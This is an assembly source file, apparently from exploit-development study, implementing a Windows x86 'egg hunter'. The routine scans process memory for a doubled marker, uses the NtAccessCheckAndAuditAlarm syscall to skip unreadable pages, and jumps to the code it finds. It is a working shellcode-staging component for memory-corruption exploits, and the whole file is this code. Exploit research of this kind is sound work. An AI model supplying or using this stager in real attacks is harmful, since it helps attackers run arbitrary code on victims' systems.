; Title: Egg hunter
; Filename: egg_hunter.nasm
; Author: Oleg Boytsev
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

global _start
section .text
_start:

cld             		;clean direction flag
next_page:
        add dx, 4095    	;next page to check
increment:
        inc   edx       	;increment memory offset
check_page:
        xor eax, eax
        mov al, 2       	;NtAccessCheckAndAuditAlarm
        push edx        	;save edx
        int 0x2e        	;syscall

        pop   edx       	;restore edx
        sub   al, 5     	;check for error (ACCESS_VIOLATION)
        jz    next_page 	;loop until no error
egg_checking:
        mov   eax, 0x376d7261   ;mov reversed marker into eax
        mov   edi, edx          ;mov edx value into edi
        scasd                   ;scan for our string
        jnz   increment         ;increment the ptr if no match
        scasd                   ;we scan for double marker
        jnz   increment         ;increment the ptr if no match
jump:
        jmp   edi               ;jmp to our marked code

